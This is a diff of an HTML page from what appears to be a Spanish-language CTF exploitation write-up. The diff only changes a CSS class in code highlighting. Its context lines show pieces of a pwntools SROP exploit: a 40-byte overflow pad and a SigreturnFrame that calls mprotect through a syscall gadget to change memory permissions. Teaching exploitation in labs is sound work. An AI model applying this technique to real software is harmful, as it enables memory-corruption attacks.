@@ -247,7 +247,7 @@ shell.recv()</span>
 
 <p class="plain-text">Las pwntools nos hace el proceso del <a href="https://docs.pwntools.com/en/stable/rop/srop.html">SROP</a> mas sencillo asi que creamos un <code class="language-plaintext highlighter-rouge">frame</code> y asignamos los valores que queremos que tengan los registros, nuestra idea será llamar a <code class="language-plaintext highlighter-rouge">mprotect</code> para cambiar los privilegios del binario, entonces almacenamos en <code class="language-plaintext highlighter-rouge">rax</code> el valor <code class="language-plaintext highlighter-rouge">0xa</code> que es su syscall number y en <code class="language-plaintext highlighter-rouge">rip</code> el gadget de <code class="language-plaintext highlighter-rouge">syscall; ret;</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">frame </span><span class="o">= </span><span class="p">SigreturnFrame(</span><span class="am">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
+<code><span class="p">frame </span><span class="o">= </span><span class="p">SigreturnFrame(</span><span class="ra">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
 frame.rax</span><span class="o"> =</span><span class="mi"> 0xa</span><span class="c1">          # mprotect()</span><span class="p">
 frame.rip</span><span class="o"> =</span><span class="mi"> 0x401014</span><span class="c1">     # syscall; ret;  </span>
 </code></pre></div></div><br>
@@ -285,7 +285,7 @@ shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span cla
 offset</span><span class="o"> =</span><span class="mi"> 40</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
 
-frame</span><span class="o"> =</span><span class="p"> SigreturnFrame(</span><span class="am">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
+frame</span><span class="o"> =</span><span class="p"> SigreturnFrame(</span><span class="ra">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
 frame.rax</span><span class="o"> =</span><span class="mi"> 0xa</span><span class="c1">          # mprotect()</span><span class="p">
 frame.rdi</span><span class="o"> =</span><span class="mi"> 0x400000</span><span class="c1">     # base address</span><span class="p">
 frame.rsi</span><span class="o"> =</span><span class="mi"> 0x2000</span><span class="c1">       # len</span><span class="p">
@@ -418,7 +418,7 @@ shell </span><span class="o">= </span><span class="p">process(</span><span class
 offset</span><span class="o"> =</span><span class="mi"> 40</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
 
-frame</span><span class="o"> =</span><span class="p"> SigreturnFrame(</span><span class="am">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
+frame</span><span class="o"> =</span><span class="p"> SigreturnFrame(</span><span class="ra">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
 frame.rax</span><span class="o"> =</span><span class="mi"> 0xa</span><span class="c1">          # mprotect()</span><span class="p">
 frame.rdi</span><span class="o"> =</span><span class="mi"> 0x400000</span><span class="c1">     # base address</span><span class="p">
 frame.rsi</span><span class="o"> =</span><span class="mi"> 0x2000</span><span class="c1">       # len</span><span class="p">
